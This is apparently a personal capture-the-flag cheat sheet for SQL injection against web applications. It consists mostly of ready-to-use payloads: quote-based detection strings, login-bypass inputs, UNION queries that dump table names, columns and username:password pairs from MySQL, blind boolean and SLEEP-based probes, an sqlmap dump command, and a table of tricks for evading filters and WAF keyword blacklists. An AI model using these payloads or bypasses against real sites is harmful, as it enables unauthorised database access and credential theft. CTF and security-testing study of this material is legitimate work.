---
title: Reflex — Web — SQL Injection
date: 2026-08-26T00:00:00.000Z
summary: >-
  Spotting an injectable parameter, confirming it in two requests, and getting
  from a quote to a dump.
tags:
  - reflexe
  - sqli
  - web
draft: false
featured: false
source: CTF/03-Reflexes/Reflexe-Web-Injection-SQL.md
topic: web
kind: reflex
---
# Reflex — SQL Injection

## 🔍 When
- A parameter that ends up in a query: `?id=1`, a login, a search bar, a sort.
- Strong signal: putting a `'` changes the page (SQL error, blank page, different result).

## ⚡ The first 3 things
1. **Break then repair**: `'` → error? then `' --` or `'-- -` → back to normal? Injectable.
2. **Login bypass** in the user field: `' OR '1'='1'-- -`
3. **UNION** as soon as it's a display: find the column count with `ORDER BY n`.

## 🧰 Payloads

```sql
-- detection
'            "            `            \
' OR 1=1-- -
' AND 1=2-- -          -- should break the page (confirms it has an effect)

-- login bypass
admin'-- -
' OR '1'='1'-- -

-- column count
' ORDER BY 1-- -   (increment until the error)
' UNION SELECT 1,2,3-- -

-- exfiltration (MySQL)
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -

-- version / current db
' UNION SELECT 1,version(),database()-- -
```

## Blind (no display, no error)
- **Boolean**: `' AND substring(database(),1,1)='a'-- -` → page changes or not.
- **Time**: `' AND SLEEP(5)-- -` → the page takes 5s. Confirms it with no visible output.
- At this stage, bring out the artillery: `sqlmap -u '...' --batch --dump`.

## 🚧 What blocks you
| Symptom | Cause | Workaround |
|---|---|---|
| `'` filtered | WAF / addslashes | encode: `%27`, or numeric injection with no quote |
| spaces blocked | naive filter | `/**/` instead of spaces, or `%09` |
| `union`/`select` blocked | keyword blacklist | `UnIoN`, `uni/**/on`, double it: `ununionion` |
| only numbers returned | wrong column type | put your data in a column that displays text |

## ✅ I've won when
You read data from a table you weren't supposed to see (often `users`, `flag`, `secret`).

## 🔗 Used in
-
